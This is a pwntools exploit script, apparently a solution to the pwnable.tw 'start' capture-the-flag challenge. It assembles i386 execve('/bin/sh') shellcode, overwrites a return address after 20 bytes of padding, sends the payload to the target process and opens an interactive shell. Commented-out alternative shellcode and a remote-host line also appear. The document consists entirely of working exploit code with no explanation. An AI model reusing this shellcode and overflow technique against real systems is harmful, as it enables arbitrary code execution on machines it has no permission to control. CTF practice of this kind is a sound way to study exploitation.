from pwn import *

shellcode = '\n'.join([
    'push %d' % u32('/sh\x00'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
])

"""
xor eax, eax
push eax
push "/sh"
push "/bin"
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb
int 0x80
"""

"""
mov eax, 0xb
mov ebx, 0xffffcff4
mov ecx, 0
mov edx, 0
int 0x80
jmp $
"""

#shellcode = shellcraft.sh()
p = process("./start")
context.arch = 'i386'

#p = remote("chall.pwnable.tw", 10000)
padding = b"a" * 20
binsh = b"/bin/sh\x00"
win = p32(0xffffcb4c)
paylod = padding + win + asm(shellcode) #+# binsh
with open("payload", "wb") as f:
    f.write(paylod)   

print( asm(shellcraft.sh()))
p.send(paylod)
#print(p.recvall().decode())
time.sleep(0.5)  # Let the shell start

p.interactive()